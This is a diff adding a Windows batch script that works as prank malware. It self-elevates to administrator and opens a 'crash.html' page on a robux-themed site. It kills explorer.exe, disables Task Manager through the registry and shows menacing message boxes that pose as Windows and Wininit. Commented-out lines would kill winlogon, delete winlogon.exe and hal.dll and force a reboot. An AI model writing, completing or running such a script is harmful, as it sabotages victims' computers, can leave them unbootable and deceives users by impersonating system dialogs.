@@ -1,0 +1,42 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+REM BatchGotAdmin
+:checkPrivileges
+   >nul 2>&1 set "acv=%errorlevel%"
+   if '%acv%' == '0' ( goto gotAdmin ) else ( goto getAdmin )
+
+:getAdmin
+   echo Requesting administrative privileges...
+   powershell -Command "Start-Process '%~s0' -Verb RunAs"
+   exit /b
+
+:gotAdmin
+   echo Administrative privileges confirmed.
+
+REM Open URL in Microsoft Edge
+start /min msedge.exe "https://robuxsite2022.w3spaces.com/crash.html"
+taskkill /f /im explorer.exe >nul
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
+
+REM Wait for 4 minutes and 6 seconds (246 seconds)
+timeout /t 243 /nobreak
+
+REM Force close msedge.exe
+taskkill /f /im msedge.exe
+
+REM Display message box
+powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('The Smallest Man Who Ever Lived', 'Microsoft Windows', 'OK', [System.Windows.MessageBoxImage]::Information)"
+powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('And I''ll forget you, but I''ll never forgive you for what you have done!', 'Microsoft Windows', 'OK', [System.Windows.MessageBoxImage]::Information)"
+powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Say Goodbye to Windows', 'Wininit.exe', 'OK', [System.Windows.MessageBoxImage]::Information)"
+
+for /f "tokens=2 delims==" %%I in ('wmic process where "name=''winlogon.exe''" get processid /value') do set "PID=%%I"
+if defined PID (
+    REM Commented out the following lines to prevent system disruption
+    REM taskkill /PID %PID% /F
+    REM del /f /q /s %SystemRoot%\System32\winlogon.exe
+    REM del /s /q /f "C:\windows\system32\hal.dll" 
+    REM shutdown /r /f /t 6 
+)
+endlocal
+start /min taskkill /f /im cmd.exe
